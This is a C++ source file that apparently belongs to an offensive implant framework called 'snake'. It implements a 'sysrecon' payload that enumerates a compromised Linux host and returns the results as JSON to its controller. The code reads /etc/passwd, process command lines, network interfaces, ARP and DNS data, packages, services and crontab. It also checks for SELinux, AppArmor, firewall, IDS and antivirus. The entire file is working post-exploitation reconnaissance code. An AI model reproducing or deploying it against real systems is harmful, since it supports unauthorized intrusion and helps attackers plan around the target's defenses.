#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <ctime>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

std::string go_arch() {
#if defined(__x86_64__)
    return "amd64";
#elif defined(__aarch64__)
    return "arm64";
#elif defined(__i386__)
    return "386";
#elif defined(__arm__)
    return "arm";
#else
    return "unknown";
#endif
}

std::string go_os() {
#if defined(__linux__)
    return "linux";
#elif defined(__APPLE__)
    return "darwin";
#else
    return "unknown";
#endif
}

std::string get_fqdn() {
    CmdResult r = run_cmd_out({"hostname", "-f"});
    if (!r.ok) return "";
    return trim(r.out);
}

std::string get_kernel_version() {
    std::string data;
    if (read_file("/proc/sys/kernel/ostype", data)) return trim(data);
    CmdResult r = run_cmd_out({"uname", "-a"});
    if (!r.ok) return go_os();
    return trim(r.out);
}

std::string get_boot_time() {
    std::string data;
    if (!read_file("/proc/stat", data)) return "";
    for (const auto& raw : split(data, '\n')) {
        if (raw.rfind("btime ", 0) != 0) continue;
        auto parts = split(raw, ' ');
        std::vector<std::string> f;
        for (auto& p : parts)
            if (!p.empty()) f.push_back(p);
        if (f.size() == 2) {
            long long sec = std::strtoll(f[1].c_str(), nullptr, 10);
            std::time_t t = (std::time_t)sec;
            std::tm tmv{};
            gmtime_r(&t, &tmv);
            char buf[32];
            std::strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%SZ", &tmv);
            return buf;
        }
    }
    return "";
}

OJ get_users() {
    OJ users = OJ::array();
    std::string data;
    if (!read_file("/etc/passwd", data)) return users;
    for (const auto& raw : split(data, '\n')) {
        std::string line = trim(raw);
        if (line.empty() || line[0] == '#') continue;
        auto parts = split(line, ':');
        if (parts.size() >= 7) {
            OJ u;
            u["username"] = parts[0];
            u["uid"] = std::atoi(parts[2].c_str());
            u["gid"] = std::atoi(parts[3].c_str());
            u["home"] = parts[5];
            u["shell"] = parts[6];
            users.push_back(u);
        }
    }
    if (users.size() > 50) {
        OJ cut = OJ::array();
        for (size_t i = 0; i < 50; ++i) cut.push_back(users[i]);
        users = cut;
    }
    return users;
}

std::string base_name(const std::string& p) {
    size_t pos = p.rfind('/');
    return pos == std::string::npos ? p : p.substr(pos + 1);
}

OJ get_processes() {
    OJ procs = OJ::array();
    DIR* d = opendir("/proc");
    if (d == nullptr) return procs;
    int count = 0;
    struct dirent* e;
    while ((e = readdir(d)) != nullptr) {
        std::string nm = e->d_name;
        if (nm.empty() || !std::isdigit((unsigned char)nm[0])) continue;
        bool numeric = true;
        for (char c : nm)
            if (!std::isdigit((unsigned char)c)) numeric = false;
        if (!numeric) continue;
        int pid = std::atoi(nm.c_str());
        std::string cmdline;
        read_file("/proc/" + nm + "/cmdline", cmdline);
        std::string name = "pid_" + std::to_string(pid);
        if (!cmdline.empty()) {
            for (char& c : cmdline)
                if (c == '\0') c = ' ';
            name = cmdline;
        }
        OJ p;
        p["pid"] = pid;
        p["name"] = base_name(name);
        p["cmdline"] = name;
        procs.push_back(p);
        if (++count >= 100) break;
    }
    closedir(d);
    return procs;
}

OJ get_interface_ips(const std::string& name) {
    OJ addrs = OJ::array();
    std::string mac;
    if (read_file("/sys/class/net/" + name + "/address", mac)) addrs.push_back("mac:" + trim(mac));
    CmdResult r = run_cmd_out({"ip", "-o", "-4", "addr", "show", name});
    if (r.ok) {
        for (const auto& raw : split(r.out, '\n')) {
            std::vector<std::string> f;
            for (auto& p : split(raw, ' '))
                if (!p.empty()) f.push_back(p);
            for (size_t i = 0; i < f.size(); ++i) {
                if (f[i] == "inet" && i + 1 < f.size()) addrs.push_back(f[i + 1]);
            }
        }
    }
    return addrs;
}

OJ get_network_info() {
    OJ net = OJ::object();
    OJ ifaces = OJ::array();

    std::string data;
    if (read_file("/proc/net/dev", data)) {
        for (const auto& raw : split(data, '\n')) {
            std::string line = trim(raw);
            if (line.find(':') == std::string::npos) continue;
            size_t pos = line.find(':');
            std::string iface = trim(line.substr(0, pos));
            OJ i;
            i["name"] = iface;
            i["addresses"] = get_interface_ips(iface);
            ifaces.push_back(i);
        }
    }
    net["interfaces"] = ifaces;

    net["connections"] = OJ::array();

    net["routing"] = OJ::array();

    OJ dns = OJ::array();
    std::string dns_data;
    if (read_file("/etc/resolv.conf", dns_data)) {
        for (const auto& raw : split(dns_data, '\n')) {
            std::string line = trim(raw);
            if (!line.empty() && line[0] != '#') dns.push_back(line);
        }
    }
    net["dns"] = dns;

    OJ arp = OJ::array();
    std::string arp_data;
    if (read_file("/proc/net/arp", arp_data)) {
        for (const auto& raw : split(arp_data, '\n')) {
            std::string line = trim(raw);
            if (line.rfind("IP", 0) != 0 && !line.empty()) arp.push_back(line);
        }
    }
    net["arp"] = arp;
    return net;
}

OJ get_hardware_info() {
    OJ h = OJ::object();
    int cpus = (int)sysconf(_SC_NPROCESSORS_ONLN);

    OJ cpu = OJ::object();
    cpu["cores"] = cpus;
    cpu["threads"] = cpus;
    std::string model;
    std::string cpuinfo;
    if (read_file("/proc/cpuinfo", cpuinfo)) {
        for (const auto& line : split(cpuinfo, '\n')) {
            if (line.rfind("model name", 0) == 0) {
                size_t pos = line.find(':');
                if (pos != std::string::npos) model = trim(line.substr(pos + 1));
                break;
            }
        }
    }
    cpu["model"] = model;
    h["cpu"] = cpu;

    OJ mem = OJ::object();
    uint64_t total = 0, avail = 0;
    std::string meminfo;
    if (read_file("/proc/meminfo", meminfo)) {
        for (const auto& line : split(meminfo, '\n')) {
            std::vector<std::string> f;
            for (auto& p : split(line, ' '))
                if (!p.empty()) f.push_back(p);
            if (f.size() < 2) continue;
            uint64_t val = std::strtoull(f[1].c_str(), nullptr, 10);
            if (line.rfind("MemTotal:", 0) == 0) {
                total = val * 1024;
            } else if (line.rfind("MemAvailable:", 0) == 0) {
                avail = val * 1024;
            }
        }
    }
    mem["total"] = total;
    mem["available"] = avail;
    double percent = 0.0;
    if (total > 0) percent = 100.0 * (double)(total - avail) / (double)total;
    mem["percent"] = percent;
    h["memory"] = mem;

    OJ disks = OJ::array();
    std::string mounts;
    if (read_file("/proc/mounts", mounts)) {
        for (const auto& raw : split(mounts, '\n')) {
            std::vector<std::string> f;
            for (auto& p : split(raw, ' '))
                if (!p.empty()) f.push_back(p);
            if (f.size() < 3) continue;
            if (f[0].rfind("/dev/", 0) != 0) continue;
            uint64_t dt = 0, dfree = 0;
            if (!disk_space(f[1], dt, dfree)) continue;
            uint64_t used = dt - dfree;
            char pct[32];
            if (dt > 0) {
                std::snprintf(pct, sizeof(pct), "%.1f%%", 100.0 * (double)used / (double)dt);
            } else {
                std::snprintf(pct, sizeof(pct), "0%%");
            }
            OJ d;
            d["device"] = f[0];
            d["mountpoint"] = f[1];
            d["fstype"] = f[2];
            d["total"] = dt;
            d["used"] = used;
            d["free"] = dfree;
            d["percent"] = pct;
            disks.push_back(d);
        }
    }
    h["disks"] = disks;
    return h;
}

OJ get_software_info() {
    OJ sw = OJ::object();
    OJ packages = OJ::array();
    struct stat st;
    if (stat("/etc/debian_version", &st) == 0) {
        CmdResult r = run_cmd_out({"dpkg", "-l"});
        if (r.ok) {
            for (const auto& line : split(r.out, '\n')) {
                if (line.rfind("ii", 0) == 0) packages.push_back(line);
            }
            if (packages.size() > 50) {
                OJ cut = OJ::array();
                for (size_t i = 0; i < 50; ++i) cut.push_back(packages[i]);
                packages = cut;
            }
        }
    }
    sw["packages"] = packages;

    OJ services = OJ::array();
    CmdResult svc = run_cmd_out({"systemctl", "list-units", "--type=service", "--state=running",
                                 "--no-pager"});
    if (svc.ok) {
        for (const auto& raw : split(svc.out, '\n')) {
            std::string line = trim(raw);
            static const std::string suf = ".service";
            if (line.size() >= suf.size() && line.compare(line.size() - suf.size(), suf.size(), suf) == 0)
                services.push_back(line);
        }
        if (services.size() > 50) {
            OJ cut = OJ::array();
            for (size_t i = 0; i < 50; ++i) cut.push_back(services[i]);
            services = cut;
        }
    }
    sw["services"] = services;

    OJ cron = OJ::array();
    CmdResult cr = run_cmd_out({"crontab", "-l"});
    if (cr.ok) {
        for (const auto& line : split(cr.out, '\n')) cron.push_back(line);
    }
    sw["cron"] = cron;
    return sw;
}

OJ get_defense_info() {
    OJ d = OJ::object();
    struct stat st;

    bool selinux = false;
    if (stat("/usr/sbin/sestatus", &st) == 0) {
        CmdResult r = run_cmd_out({"sestatus"});
        if (r.ok) {
            std::string low = r.out;
            std::transform(low.begin(), low.end(), low.begin(), ::tolower);
            selinux = low.find("enabled") != std::string::npos;
        }
    }
    d["selinux"] = selinux;

    bool apparmor = false;
    std::string aa;
    if (stat("/sys/module/apparmor/parameters/enabled", &st) == 0 && read_file("/sys/module/apparmor/parameters/enabled", aa))
        apparmor = trim(aa) == "Y";
    d["apparmor"] = apparmor;

    bool firewall = false;
    CmdResult fw = run_cmd_out({"iptables", "-L", "-n"});
    if (fw.ok) firewall = fw.out.find("Chain INPUT") != std::string::npos;
    d["firewall"] = firewall;

    d["ids"] = OJ::array();
    d["antivirus"] = OJ::array();
    return d;
}

class SysRecon : public Payload {
  public:
    const char* name() const override { return "sysrecon"; }
    const char* category() const override { return "recon"; }
    const char* description() const override {
        return "Full system enumeration (OS, kernel, users, processes, network, hardware, software, defenses)";
    }

    Output execute(const Args&) const override {
        OJ info = OJ::object();
        info["timestamp"] = now_rfc3339();
        info["hostname"] = hostname_now();
        info["fqdn"] = get_fqdn();

        OJ os = OJ::object();
        os["arch"] = go_arch();
        os["goVersion"] = "n/a (solidsnake c++17)";
        os["system"] = go_os();
        info["os"] = os;

        info["kernel"] = get_kernel_version();
        info["boot_time"] = get_boot_time();
        info["users"] = get_users();
        info["processes"] = get_processes();
        info["network"] = get_network_info();
        info["hardware"] = get_hardware_info();
        info["software"] = get_software_info();
        info["defenses"] = get_defense_info();

        std::string s = MarshalJSON(info);
        return Output(s.begin(), s.end());
    }
};

SysRecon g_sysrecon;

struct Registrar {
    Registrar() { Register(&g_sysrecon); }
};
Registrar g_registrar;

}  // namespace
}  // namespace snake::payloads
